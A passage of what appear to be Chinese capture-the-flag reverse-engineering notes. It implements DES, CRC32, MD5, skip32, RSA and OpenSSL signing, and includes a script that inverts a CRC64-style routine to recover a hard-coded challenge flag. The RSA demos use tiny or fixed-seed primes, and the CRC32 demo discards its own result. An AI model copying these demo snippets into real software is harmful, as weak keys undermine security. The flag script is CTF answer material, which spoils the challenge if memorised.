7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6,      4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14,      11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3      ]S6 = [12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11,      10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8,      9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6,      4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13      ]S7 = [4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1,      13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6,      1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2,      6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12      ]S8 = [13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7,      1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2,      7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8,      2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11      ]S = [S1, S2, S3, S4, S5, S6, S7, S8]# P盒P = [16, 7, 20, 21, 29, 12, 28, 17,     1, 15, 23, 26, 5, 18, 31, 10,     2, 8, 24, 14, 32, 27, 3, 9,     19, 13, 30, 6, 22, 11, 4, 25     ]# encryptdef ip_change(bin_text):    &quot;&quot;&quot;初始置换&quot;&quot;&quot;    return [bin_text[i - 1] for i in IP]def s_box(bin_result):    &quot;&quot;&quot;S盒替换&quot;&quot;&quot;    int_result = []    result = &#x27;&#x27;    for i in range(8):        # 二进制行号        bin_row = bin_result[i][0] + bin_result[i][5]        # 二进制列号        bin_col = &#x27;&#x27;.join(bin_result[i][j] for j in range(1, 5))        # 获取对应的十进制数        int_result.append(S[i][16 * int(bin_row, base=2) + int(bin_col, base=2)])        # 十进制转成二进制        result += bin(int_result[-1])[2:].zfill(4)    return resultdef p_box(result):    &quot;&quot;&quot;P盒置换&quot;&quot;&quot;    return &#x27;&#x27;.join(result[i - 1] for i in P)def f(R, bin_key):    &quot;&quot;&quot;轮函数f()&quot;&quot;&quot;    # 1.将R由32位扩展成48位    R_ext = [R[i - 1] for i in E]    # 2.与子密钥进行逐位异或    bin_temp = [str(int(r) ^ int(k)) for r, k in zip(R_ext, bin_key)]    # 6个字符为一组，共8组    bin_result = [&#x27;&#x27;.join(bin_temp[i:i + 6]) for i in range(0, len(bin_temp), 6)]    # 3.S盒替换 48-&gt;32    result = s_box(bin_result)    # 4.P盒置换 32-&gt;32    return p_box(result)def _ip_change(bin_text):    &quot;&quot;&quot;进行IP-1逆置换&quot;&quot;&quot;    return &#x27;&#x27;.join(bin_text[i - 1] for i in _IP)def des_cipher(bin_text, bin_key, reverse_keys=False):    &quot;&quot;&quot;通用DES加密解密函数&quot;&quot;&quot;    # 1. 初始置换IP    bin_text = ip_change(bin_text)    # 2. 分成左右两部分L、R    L, R = bin_text[:32], bin_text[32:]    # 3. 获得16轮子密钥    subkey_list = get_subkey_list(bin_key)    if reverse_keys:        subkey_list = subkey_list[::-1]  # 解密时反转子密钥列表    # 4. 进行16轮迭代    for i in subkey_list:        R_temp = R        # 轮函数f()结果和L进行异或        R = &#x27;&#x27;.join(str(int(r) ^ int(l)) for r, l in zip(f(R, i), L))        L = R_temp    # 5. 进行IP-1逆置换 64-&gt;64    return _ip_change(R + L)  # 输出二进制字符串# 使用示例def str2bin(text):    &quot;&quot;&quot;字符串转二进制字符串&quot;&quot;&quot;    return &#x27;&#x27;.join(bin(byte)[2:].zfill(8) for byte in text.encode())def bin2str(bin_text):    &quot;&quot;&quot;二进制字符串转字符串&quot;&quot;&quot;    # 1.将二进制字符串按8位分割，并转换为字节数组    byte_array = bytearray(int(i, 2) for i in re.findall(r&#x27;.&#123;8&#125;&#x27;, bin_text) if int(i, 2) != 0)    # 2.将字节序列解码为字符串    return byte_array.decode()def is_valid_key(key):    &quot;&quot;&quot;检查密钥是否有效 64bit&quot;&quot;&quot;    return len(key.encode()) == 8def des_encrypt(plaintext, key):    &quot;&quot;&quot;DES加密&quot;&quot;&quot;    # 1.明文转成二进制字符串, 0填充至64的倍数    bin_plaintext = str2bin(plaintext)    padding_len = (64 - (len(bin_plaintext) % 64)) % 64    bin_padding_plaintext = bin_plaintext + &#x27;0&#x27; * padding_len    # 2.进行64位分组加密    bin_group_64 = re.findall(r&#x27;.&#123;64&#125;&#x27;, bin_padding_plaintext)    bin_ciphertext = &#x27;&#x27;    for g in bin_group_64:        bin_ciphertext += des_cipher(g, str2bin(key))    # 3.密文转为16进制输出    bin_group_4 = re.findall(r&#x27;.&#123;4&#125;&#x27;, bin_ciphertext)    hex_ciphertext = &#x27;&#x27;    for g in bin_group_4:        hex_ciphertext += format(int(g, 2), &#x27;x&#x27;)    return hex_ciphertextdef des_decrypt(hex_ciphertext, key):    &quot;&quot;&quot;DES解密&quot;&quot;&quot;    # 1.16进制密文转为2进制字符串    bin_ciphertext = &#x27;&#x27;.join(bin(int(h, 16))[2:].zfill(4) for h in hex_ciphertext)    # 2.进行64位分组解密    bin_group_64 = re.findall(r&#x27;.&#123;64&#125;&#x27;, bin_ciphertext)    bin_deciphertext = &#x27;&#x27;    for g in bin_group_64:        bin_deciphertext += des_cipher(g, str2bin(key), reverse_keys=True)    # 3.将解密密文转为字符串输出    return bin2str(bin_deciphertext)def des_run():    &quot;&quot;&quot;DES启动界面&quot;&quot;&quot;    flag = True    while flag:        print(&#x27;=&#x27; * 3, &quot;DES加密解密&quot;, &#x27;=&#x27; * 3)        print(&#x27;[1]加密&#x27;)        print(&#x27;[2]解密&#x27;)        print(&#x27;[0]退出&#x27;)        choice = input(&#x27;请输入你的选择：&#x27;)        match choice:            case &#x27;0&#x27;:                flag = False            case &#x27;1&#x27;:                plaintext = input(&#x27;请输入明文:&#x27;)                key = input(&#x27;请输入密钥(64bit):&#x27;)                if not is_valid_key(key):                    print(&#x27;密钥长度错误&#x27;)                    continue                ciphertext = des_encrypt(plaintext, key)                print(f&#x27;密文:&#123;ciphertext&#125;&#x27;)            case &#x27;2&#x27;:                ciphertext = input(&#x27;请输入密文:&#x27;)                key = input(&#x27;请输入密钥(64bit):&#x27;)                if not is_valid_key(key):                    print(&#x27;密钥长度错误&#x27;)                    continue                print(f&#x27;解密:&#123;des_decrypt(ciphertext, key)&#125;&#x27;)            case _:                print(&#x27;输入错误&#x27;)    print(&#x27;=&#x27; * 15)if __name__ == &#x27;__main__&#x27;:    des_run()\n\n\nCRC64CRC校验原理及实现 - 知乎\n循环冗余校验（Cyclic Redundancy Check， CRC）是一种根据网络数据包或计算机文件等数据产生简短固定位数校验码的一种信道编码技术，主要用来检测或校验数据传输或者保存后可能出现的错误。\n本质就是一种多项式除法，把原二进制与一个另一个二进制以多项式的形式相除，最后把余数添加到数据末尾用于检验。\n我们可以用赛博厨师计算crc的值。\n解密脚本(特征)import structdef shld(a1, a2):    return ((a1 &lt;&lt; 1) | (a2 &gt;&gt; 31)) &amp; 0xffffffffdef shl(a1):    return (a1 &lt;&lt; 1) &amp; 0xffffffffdef shr(a1):    return (a1 &gt;&gt; 1) &amp; 0xffffffffdef de(buf):    for i in range(0, 10, 2):        ta = buf[i]        tb = buf[i + 1]        for k in range(64):            if (ta &amp; 1):                ta = (0x54AA4A9 ^ ta) &amp; 0xffffffff                ta = shr(ta) | ((tb &amp; 1) &lt;&lt; 31)                tb = shr(tb) | (1 &lt;&lt; 31)            else:                ta = shr(ta) | ((tb &amp; 1) &lt;&lt; 31)                tb = shr(tb)        buf[i] = ta        buf[i + 1] = tbdef main():    flag = [0x149b24c1, 0xbc17996, 0x192ce051, 0x1666bae6, 0xf0f13109, 0x713168a1, 0xcc4fa796, 0x9d5344d9, 0x623329f6, 0x5e22b5da]    de(flag)    for i in range(len(flag)):        print(hex(flag[i]), end=&#x27;, &#x27;)    print()    flag = b&#x27;&#x27;.join(struct.pack(&quot;&lt;I&quot;, i) for i in flag)    print(flag)if __name__ == &#x27;__main__&#x27;:    main()\n\ncrc32#include &lt;stdint.h&gt;  #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;  #define CRC32_POLYNOMIAL 0xEDB88320  uint32_t crc32_table[256];void generate_crc32_table() &#123;    uint32_t crc;    for (int i = 0; i &lt; 256; i++) &#123;        crc = i;        for (int j = 0; j &lt; 8; j++) &#123;            if (crc &amp; 1) &#123;                crc = (crc &gt;&gt; 1) ^ CRC32_POLYNOMIAL;            &#125;            else &#123;                crc &gt;&gt;= 1;            &#125;        &#125;        crc32_table[i] = crc;    &#125;&#125;uint32_t crc32(const uint8_t* data, size_t length) &#123;    uint32_t crc = 0xFFFFFFFF;    for (size_t i = 0; i &lt; length; i++) &#123;        crc = (crc &gt;&gt; 8) ^ crc32_table[(crc ^ data[i]) &amp; 0xFF];    &#125;    return crc ^ 0xFFFFFFFF;&#125;int main() &#123;    uint8_t data[100] = &#123;&#125;;    uint32_t result[10];    result[0] = crc32(data, 100);    for (int i = 0; i &lt; 1; i++) &#123;        printf(&quot;%2x&quot;, data[i]);    &#125;&#125;\n\n\n\nHash\n数据摘要算法，可以理解为有损压缩\n因此，hash不可逆，所以如果解题遇到hash基本以算法识别+撞库为主\nmd5、sha1、sha256、sha384、sha512等等\n加密过程有大量移位操作且不可逆\n\nMD5演示动画\n特征常量\n67452301h0EFCDAB89h98BADCFEh 10325476h\n\n#include&lt;string.h&gt;#include&lt;stdio.h&gt;typedef unsigned char* POINTER; //指针类型定义typedef struct &#123;\tunsigned int state[4];                                   /* A,B,C,D四个常数 */\tunsigned int count[2];        /* 数据的bit数计数器(对2^64取余) */\tunsigned char buffer[64];                         /* 输入数据缓冲区 */&#125; MD5_CTX; //存放MD5算法相关信息的结构体定义void MD5Init(MD5_CTX*);void MD5Update(MD5_CTX*, unsigned char*, unsigned int);void MD5Final(unsigned char[16], MD5_CTX*);void MD5Transform(unsigned int[4], unsigned char[64]);void Encode(unsigned char*, unsigned int*, unsigned int);void Decode(unsigned int*, unsigned char*, unsigned int);//循环左移的位数#define S11 7#define S12 12#define S13 17#define S14 22#define S21 5#define S22 9#define S23 14#define S24 20#define S31 4#define S32 11#define S33 16#define S34 23#define S41 6#define S42 10#define S43 15#define S44 21//数据填充的内容unsigned char PADDING[64] = &#123;  0x80, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0&#125;;//F,G,H,I四个非线性变换函数#define F(x, y, z) (((x) &amp; (y)) | ((~x) &amp; (z)))#define G(x, y, z) (((x) &amp; (z)) | ((y) &amp; (~z)))#define H(x, y, z) ((x) ^ (y) ^ (z))#define I(x, y, z) ((y) ^ ((x) | (~z)))//x循环左移n位的操作#define ROTATE_LEFT(x, n) (((x) &lt;&lt; (n)) | ((x) &gt;&gt; (32-(n))))//FF,GG,HH,II是四轮循环变换分别用到的变换函数#define FF(a, b, c, d, x, s, ac) &#123; \\ (a) += F ((b), (c), (d)) + (x) + (unsigned int)(ac); \\ (a) = ROTATE_LEFT ((a), (s)); \\ (a) += (b); \\  &#125;#define GG(a, b, c, d, x, s, ac) &#123; \\ (a) += G ((b), (c), (d)) + (x) + (unsigned int)(ac); \\ (a) = ROTATE_LEFT ((a), (s)); \\ (a) += (b); \\  &#125;#define HH(a, b, c, d, x, s, ac) &#123; \\ (a) += H ((b), (c), (d)) + (x) + (unsigned int)(ac); \\ (a) = ROTATE_LEFT ((a), (s)); \\ (a) += (b); \\  &#125;#define II(a, b, c, d, x, s, ac) &#123; \\ (a) += I ((b), (c), (d)) + (x) + (unsigned int)(ac); \\ (a) = ROTATE_LEFT ((a), (s)); \\ (a) += (b); \\  &#125;//MD5算法初始化操作void MD5Init(MD5_CTX* context)&#123;\t//bit计数器清零\tcontext-&gt;count[0] = context-&gt;count[1] = 0;\t//A,B,C,D被初始化为四个特定的常数(Magic Number)\tcontext-&gt;state[0] = 0x67452301;\tcontext-&gt;state[1] = 0xefcdab89;\tcontext-&gt;state[2] = 0x98badcfe;\tcontext-&gt;state[3] = 0x10325476;&#125;//使用MD5算法对input的数据进行处理void MD5Update(MD5_CTX* context, unsigned char* input, unsigned int inputLen)&#123;\tunsigned int i, index, partLen;\t//计算[已处理数据长度(byte) mod 64]\tindex = (unsigned int)((context-&gt;count[0] &gt;&gt; 3) &amp; 0x3F);\t//bit计数器累加\tif ((context-&gt;count[0] += ((unsigned int)inputLen &lt;&lt; 3))\t\t&lt; ((unsigned int)inputLen &lt;&lt; 3)) //处理加法进位溢出的情况\t\tcontext-&gt;count[1]++;\tcontext-&gt;count[1] += ((unsigned int)inputLen &gt;&gt; 29);\t//计算缓冲区还有多少字节空间\tpartLen = 64 - index;\t//以512位数据为一组进行处理\tif (inputLen &gt;= partLen) &#123;\t\tmemcpy(&amp;context-&gt;buffer[index], input, partLen);\t\tMD5Transform(context-&gt;state, context-&gt;buffer);\t\tfor (i = partLen; i + 63 &lt; inputLen; i += 64)\t\t\tMD5Transform(context-&gt;state, &amp;input[i]);\t\tindex = 0;\t&#125;\telse i = 0;\t//缓存未处理的输入\tmemcpy(&amp;context-&gt;buffer[index], &amp;input[i], inputLen - i);&#125;//获取MD5码（由digest返回），顺便清除context数据void MD5Final(unsigned char digest[16], MD5_CTX* context)&#123;\tunsigned char bits[8];\tunsigned int index, padLen;\t//记录数据长度\tEncode(bits, context-&gt;count, 8);\t//填充数据\tindex = (unsigned int)((context-&gt;count[0] &gt;&gt; 3) &amp; 0x3f);\tpadLen = (index &lt; 56) ? (56 - index) : (120 - index);\tMD5Update(context, PADDING, padLen);\t//追加数据长度信息\tMD5Update(context, bits, 8);\t//获取MD5码。其实就是将ABCD四个32位整数以16进制方式级联\tEncode(digest, context-&gt;state, 16);\t//清除数据\tmemset(context, 0, sizeof(*context));&#125;//MD5变换函数void MD5Transform(unsigned int state[4], unsigned char block[64])&#123;\tunsigned int a = state[0], b = state[1], c = state[2], d = state[3], x[16];\t//将64字节的一组数据进一步划分为16个子分组\tDecode(x, block, 64);\t//第1轮循环变换\tFF(a, b, c, d, x[0], S11, 0xd76aa478); /* 1 */\tFF(d, a, b, c, x[1], S12, 0xe8c7b756); /* 2 */\tFF(c, d, a, b, x[2], S13, 0x242070db); /* 3 */\tFF(b, c, d, a, x[3], S14, 0xc1bdceee); /* 4 */\tFF(a, b, c, d, x[4], S11, 0xf57c0faf); /* 5 */\tFF(d, a, b, c, x[5], S12, 0x4787c62a); /* 6 */\tFF(c, d, a, b, x[6], S13, 0xa8304613); /* 7 */\tFF(b, c, d, a, x[7], S14, 0xfd469501); /* 8 */\tFF(a, b, c, d, x[8], S11, 0x698098d8); /* 9 */\tFF(d, a, b, c, x[9], S12, 0x8b44f7af); /* 10 */\tFF(c, d, a, b, x[10], S13, 0xffff5bb1); /* 11 */\tFF(b, c, d, a, x[11], S14, 0x895cd7be); /* 12 */\tFF(a, b, c, d, x[12], S11, 0x6b901122); /* 13 */\tFF(d, a, b, c, x[13], S12, 0xfd987193); /* 14 */\tFF(c, d, a, b, x[14], S13, 0xa679438e); /* 15 */\tFF(b, c, d, a, x[15], S14, 0x49b40821); /* 16 */\t//第2轮循环变换\tGG(a, b, c, d, x[1], S21, 0xf61e2562); /* 17 */\tGG(d, a, b, c, x[6], S22, 0xc040b340); /* 18 */\tGG(c, d, a, b, x[11], S23, 0x265e5a51); /* 19 */\tGG(b, c, d, a, x[0], S24, 0xe9b6c7aa); /* 20 */\tGG(a, b, c, d, x[5], S21, 0xd62f105d); /* 21 */\tGG(d, a, b, c, x[10], S22, 0x2441453); /* 22 */\tGG(c, d, a, b, x[15], S23, 0xd8a1e681); /* 23 */\tGG(b, c, d, a, x[4], S24, 0xe7d3fbc8); /* 24 */\tGG(a, b, c, d, x[9], S21, 0x21e1cde6); /* 25 */\tGG(d, a, b, c, x[14], S22, 0xc33707d6); /* 26 */\tGG(c, d, a, b, x[3], S23, 0xf4d50d87); /* 27 */\tGG(b, c, d, a, x[8], S24, 0x455a14ed); /* 28 */\tGG(a, b, c, d, x[13], S21, 0xa9e3e905); /* 29 */\tGG(d, a, b, c, x[2], S22, 0xfcefa3f8); /* 30 */\tGG(c, d, a, b, x[7], S23, 0x676f02d9); /* 31 */\tGG(b, c, d, a, x[12], S24, 0x8d2a4c8a); /* 32 */\t//第3轮循环变换\tHH(a, b, c, d, x[5], S31, 0xfffa3942); /* 33 */\tHH(d, a, b, c, x[8], S32, 0x8771f681); /* 34 */\tHH(c, d, a, b, x[11], S33, 0x6d9d6122); /* 35 */\tHH(b, c, d, a, x[14], S34, 0xfde5380c); /* 36 */\tHH(a, b, c, d, x[1], S31, 0xa4beea44); /* 37 */\tHH(d, a, b, c, x[4], S32, 0x4bdecfa9); /* 38 */\tHH(c, d, a, b, x[7], S33, 0xf6bb4b60); /* 39 */\tHH(b, c, d, a, x[10], S34, 0xbebfbc70); /* 40 */\tHH(a, b, c, d, x[13], S31, 0x289b7ec6); /* 41 */\tHH(d, a, b, c, x[0], S32, 0xeaa127fa); /* 42 */\tHH(c, d, a, b, x[3], S33, 0xd4ef3085); /* 43 */\tHH(b, c, d, a, x[6], S34, 0x4881d05); /* 44 */\tHH(a, b, c, d, x[9], S31, 0xd9d4d039); /* 45 */\tHH(d, a, b, c, x[12], S32, 0xe6db99e5); /* 46 */\tHH(c, d, a, b, x[15], S33, 0x1fa27cf8); /* 47 */\tHH(b, c, d, a, x[2], S34, 0xc4ac5665); /* 48 */\t//第4轮循环变换\tII(a, b, c, d, x[0], S41, 0xf4292244); /* 49 */\tII(d, a, b, c, x[7], S42, 0x432aff97); /* 50 */\tII(c, d, a, b, x[14], S43, 0xab9423a7); /* 51 */\tII(b, c, d, a, x[5], S44, 0xfc93a039); /* 52 */\tII(a, b, c, d, x[12], S41, 0x655b59c3); /* 53 */\tII(d, a, b, c, x[3], S42, 0x8f0ccc92); /* 54 */\tII(c, d, a, b, x[10], S43, 0xffeff47d); /* 55 */\tII(b, c, d, a, x[1], S44, 0x85845dd1); /* 56 */\tII(a, b, c, d, x[8], S41, 0x6fa87e4f); /* 57 */\tII(d, a, b, c, x[15], S42, 0xfe2ce6e0); /* 58 */\tII(c, d, a, b, x[6], S43, 0xa3014314); /* 59 */\tII(b, c, d, a, x[13], S44, 0x4e0811a1); /* 60 */\tII(a, b, c, d, x[4], S41, 0xf7537e82); /* 61 */\tII(d, a, b, c, x[11], S42, 0xbd3af235); /* 62 */\tII(c, d, a, b, x[2], S43, 0x2ad7d2bb); /* 63 */\tII(b, c, d, a, x[9], S44, 0xeb86d391); /* 64 */\tstate[0] += a;\tstate[1] += b;\tstate[2] += c;\tstate[3] += d;&#125;//将无符号整数转为字节类型数组void Encode(unsigned char* output, unsigned int* input, unsigned int len)&#123;\tunsigned int i, j;\tfor (i = 0, j = 0; j &lt; len; i++, j += 4) &#123;\t\toutput[j] = (unsigned char)(input[i] &amp; 0xff);\t\toutput[j + 1] = (unsigned char)((input[i] &gt;&gt; 8) &amp; 0xff);\t\toutput[j + 2] = (unsigned char)((input[i] &gt;&gt; 16) &amp; 0xff);\t\toutput[j + 3] = (unsigned char)((input[i] &gt;&gt; 24) &amp; 0xff);\t&#125;&#125;//将字节类型数组转为无符号整数void Decode(unsigned int* output, unsigned char* input, unsigned int len)&#123;\tunsigned int i, j;\tfor (i = 0, j = 0; j &lt; len; i++, j += 4)\t\toutput[i] = ((unsigned int)input[j]) | (((unsigned int)input[j + 1]) &lt;&lt; 8) |\t\t(((unsigned int)input[j + 2]) &lt;&lt; 16) | (((unsigned int)input[j + 3]) &lt;&lt; 24);&#125;int main()&#123;\tMD5_CTX md5_calc;\t//char c[] = &#123; 0,0,0,4,0,0,0,2,0,0,0,125&#125;;\tunsigned int c[] = &#123; 0x00000007, 0x00000002, 0x0000007D &#125;;\tunsigned char md5[16];\t//演示计算字符串abc的MD5码\tMD5Init(&amp;md5_calc);\tMD5Update(&amp;md5_calc, (unsigned char*)c, 12);\tMD5Final(md5, &amp;md5_calc);\t//输出MD5码\tfor (int i = 0; i &lt; 16; i++) &#123;\t\tmd5[i] ^= 0x14;\t\tmd5[i] ^= 0x11;\t&#125;\tprintf(&quot;字符串abc的MD5码为：&quot;);\tfor (int i = 0; i &lt; 16; i++) printf(&quot;%02x&quot;, md5[i]);\tprintf(&quot;\\n&quot;);\treturn 0;&#125;\n\nskip32#!/usr/bin/env python3import structFTABLE = (0xa3, 0xd7, 0x09, 0x83, 0xf8, 0x48, 0xf6, 0xf4,          0xb3, 0x21, 0x15, 0x78, 0x99, 0xb1, 0xaf, 0xf9,          0xe7, 0x2d, 0x4d, 0x8a, 0xce, 0x4c, 0xca, 0x2e,          0x52, 0x95, 0xd9, 0x1e, 0x4e, 0x38, 0x44, 0x28,          0x0a, 0xdf, 0x02, 0xa0, 0x17, 0xf1, 0x60, 0x68,          0x12, 0xb7, 0x7a, 0xc3, 0xe9, 0xfa, 0x3d, 0x53,          0x96, 0x84, 0x6b, 0xba, 0xf2, 0x63, 0x9a, 0x19,          0x7c, 0xae, 0xe5, 0xf5, 0xf7, 0x16, 0x6a, 0xa2,          0x39, 0xb6, 0x7b, 0x0f, 0xc1, 0x93, 0x81, 0x1b,          0xee, 0xb4, 0x1a, 0xea, 0xd0, 0x91, 0x2f, 0xb8,          0x55, 0xb9, 0xda, 0x85, 0x3f, 0x41, 0xbf, 0xe0,          0x5a, 0x58, 0x80, 0x5f, 0x66, 0x0b, 0xd8, 0x90,          0x35, 0xd5, 0xc0, 0xa7, 0x33, 0x06, 0x65, 0x69,          0x45, 0x00, 0x94, 0x56, 0x6d, 0x98, 0x9b, 0x76,          0x97, 0xfc, 0xb2, 0xc2, 0xb0, 0xfe, 0xdb, 0x20,          0xe1, 0xeb, 0xd6, 0xe4, 0xdd, 0x47, 0x4a, 0x1d,          0x42, 0xed, 0x9e, 0x6e, 0x49, 0x3c, 0xcd, 0x43,          0x27, 0xd2, 0x07, 0xd4, 0xde, 0xc7, 0x67, 0x18,          0x89, 0xcb, 0x30, 0x1f, 0x8d, 0xc6, 0x8f, 0xaa,          0xc8, 0x74, 0xdc, 0xc9, 0x5d, 0x5c, 0x31, 0xa4,          0x70, 0x88, 0x61, 0x2c, 0x9f, 0x0d, 0x2b, 0x87,          0x50, 0x82, 0x54, 0x64, 0x26, 0x7d, 0x03, 0x40,          0x34, 0x4b, 0x1c, 0x73, 0xd1, 0xc4, 0xfd, 0x3b,          0xcc, 0xfb, 0x7f, 0xab, 0xe6, 0x3e, 0x5b, 0xa5,          0xad, 0x04, 0x23, 0x9c, 0x14, 0x51, 0x22, 0xf0,          0x29, 0x79, 0x71, 0x7e, 0xff, 0x8c, 0x0e, 0xe2,          0x0c, 0xef, 0xbc, 0x72, 0x75, 0x6f, 0x37, 0xa1,          0xec, 0xd3, 0x8e, 0x62, 0x8b, 0x86, 0x10, 0xe8,          0x08, 0x77, 0x11, 0xbe, 0x92, 0x4f, 0x24, 0xc5,          0x32, 0x36, 0x9d, 0xcf, 0xf3, 0xa6, 0xbb, 0xac,          0x5e, 0x6c, 0xa9, 0x13, 0x57, 0x25, 0xb5, 0xe3,          0xbd, 0xa8, 0x3a, 0x01, 0x05, 0x59, 0x2a, 0x46)def g(key, k, w):    g1 = 0xFF &amp; (w &gt;&gt; 8)    g2 = 0xFF &amp; w    g3 = FTABLE[g2 ^ key[(4 * k + 0) % 10]] ^ g1    g4 = FTABLE[g3 ^ key[(4 * k + 1) % 10]] ^ g2    g5 = FTABLE[g4 ^ key[(4 * k + 2) % 10]] ^ g3    g6 = FTABLE[g5 ^ key[(4 * k + 3) % 10]] ^ g4    return ((g5 &lt;&lt; 8) + g6)def skip32(key, buf, encrypt):    # sort out direction    if encrypt:        k, step = 0, 1    else:        k, step = 23, -1    # pack into words    wl = (buf[0] &lt;&lt; 8) + buf[1]    wr = (buf[2] &lt;&lt; 8) + buf[3]    # 24 feistel rounds, doubled up    for _ in range(12):        wr ^= g(key, k, wl) ^ k        k += step        wl ^= g(key, k, wr) ^ k        k += step    # implicitly swap halves while unpacking    return bytes((wr &gt;&gt; 8, wr &amp; 0xFF,                  wl &gt;&gt; 8, wl &amp; 0xFF))class Skippy:    def __init__(self, key):        if len(key) &lt; 10:            raise ValueError(&quot;key must be at least 10 bytes in length&quot;)        self._key = key    def encrypt(self, value):        buf = struct.pack(&quot;=I&quot;, value)        enc = skip32(self._key, buf, True)        return struct.unpack(&quot;=I&quot;, enc)[0]    def decrypt(self, value):        buf = struct.pack(&quot;=I&quot;, value)        dec = skip32(self._key, buf, False)        return struct.unpack(&quot;=I&quot;, dec)[0]\n\n\n\nRSAfrom Crypto.Util.number import inverse, getPrimeimport randomp = 61q = 53n = p * qphi = (p - 1) * (q - 1)e = 65537d = inverse(e, phi)print(f&quot;n = &#123;n&#125;&quot;)print(f&quot;e = &#123;e&#125;&quot;)print(f&quot;d = &#123;d&#125;&quot;)m = 42# 加密c = pow(m, e, n)print(f&quot;Encrypted c = &#123;c&#125;&quot;)# 解密m2 = pow(c, d, n)print(f&quot;Decrypted m = &#123;m2&#125;&quot;)\n\n\n\n#include &lt;gmpxx.h&gt;#include &lt;iostream&gt;mpz_class hex_to_mpz(const std::string&amp; hex) &#123;    mpz_class res;    mpz_set_str(res.get_mpz_t(), hex.c_str(), 16); // base 16    return res;&#125;mpz_class generate_prime(unsigned int bits, gmp_randclass&amp; rng, int trials = 25) &#123;    mpz_class candidate;    while (true) &#123;        candidate = rng.get_z_bits(bits);     // 生成随机 bits 位数的大整数        mpz_setbit(candidate.get_mpz_t(), bits - 1); // 确保是 bits 位        mpz_setbit(candidate.get_mpz_t(), 0);        // 确保是奇数        if (mpz_probab_prime_p(candidate.get_mpz_t(), trials) &gt; 0) &#123;            return candidate;        &#125;    &#125;&#125;int main() &#123;    gmp_randclass rng(gmp_randinit_mt);    rng.seed(1);    mpz_class p = generate_prime(512, rng);    mpz_class q = generate_prime(512, rng);    mpz_class n = p * q;                   // n = p * q    mpz_class phi = (p - 1) * (q - 1);     // phi = (p-1)*(q-1)    mpz_class e = 65537;                      // 常用 e    mpz_class d;    // 求模逆 d ≡ e^(-1) mod phi    if (!mpz_invert(d.get_mpz_t(), e.get_mpz_t(), phi.get_mpz_t())) &#123;        std::cerr &lt;&lt; &quot;Modular inverse does not exist!\\n&quot;;        return 1;    &#125;    std::cout &lt;&lt; &quot;n  = &quot; &lt;&lt; n &lt;&lt; std::endl;    std::cout &lt;&lt; &quot;e  = &quot; &lt;&lt; e &lt;&lt; std::endl;    std::cout &lt;&lt; &quot;d  = &quot; &lt;&lt; d &lt;&lt; std::endl;    // 明文 m    mpz_class m = hex_to_mpz(&quot;1234567890abcdef&quot;);    // 加密 c = m^e mod n    mpz_class c;        mpz_powm(c.get_mpz_t(), m.get_mpz_t(), e.get_mpz_t(), n.get_mpz_t());    std::cout &lt;&lt; &quot;Encrypted c = &quot; &lt;&lt; c &lt;&lt; std::endl;    // 解密 m2 = c^d mod n    mpz_class m2;    mpz_powm(m2.get_mpz_t(), c.get_mpz_t(), d.get_mpz_t(), n.get_mpz_t());    std::cout &lt;&lt; &quot;Decrypted m = &quot; &lt;&lt; m2 &lt;&lt; std::endl;    char r[100];    __gmpz_get_str(r, 16, m2.get_mpz_t());    std::cout &lt;&lt; &quot;Decrypted hex: &quot; &lt;&lt; r &lt;&lt; std::endl;    return 0;&#125;\n\n\n\nopensslEVP签名校验#include &lt;openssl/evp.h&gt;#include &lt;openssl/pem.h&gt;#include &lt;openssl/rsa.h&gt;#include &lt;openssl/err.h&gt;#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;memory&gt;#include &lt;cstring&gt;void handle_openssl_error() &#123;    ERR_print_errors_fp(stderr);    abort();&#125;// 使用智能指针管理 OpenSSL 结构using EVP_PKEY_ptr = std::unique_ptr&lt;EVP_PKEY, decltype(&amp;EVP_PKEY_free)&gt;;using EVP_MD_CTX_ptr = std::unique_ptr&lt;EVP_MD_CTX, decltype(&amp;EVP_MD_CTX_free)&gt;;EVP_PKEY_ptr generate_rsa_key(int bits = 2048) &#123;    EVP_PKEY_CTX *ctx = EVP_PKEY_CTX_new_id(EVP_PKEY_RSA, NULL);    if (!ctx) handle_openssl_error();    if (EVP_PKEY_keygen_init(ctx) &lt;= 0) handle_openssl_error();    if (EVP_PKEY_CTX_set_rsa_keygen_bits(ctx, bits) &lt;= 0) handle_openssl_error();    EVP_PKEY *raw_pkey = nullptr;    if (EVP_PKEY_keygen(ctx, &amp;raw_pkey) &lt;= 0) handle_openssl_error();    EVP_PKEY_CTX_free(ctx);    return EVP_PKEY_ptr(raw_pkey, EVP_PKEY_free);&#125;std::vector&lt;unsigned char&gt; sign_message(EVP_PKEY *pkey, const unsigned char *msg, size_t msg_len) &#123;    EVP_MD_CTX_ptr ctx(EVP_MD_CTX_new(), EVP_MD_CTX_free);    if (!ctx) handle_openssl_error();    if (EVP_DigestSignInit(ctx.get(), NULL, EVP_sha256(), NULL, pkey) &lt;= 0)        handle_openssl_error();    if (EVP_DigestSignUpdate(ctx.get(), msg, 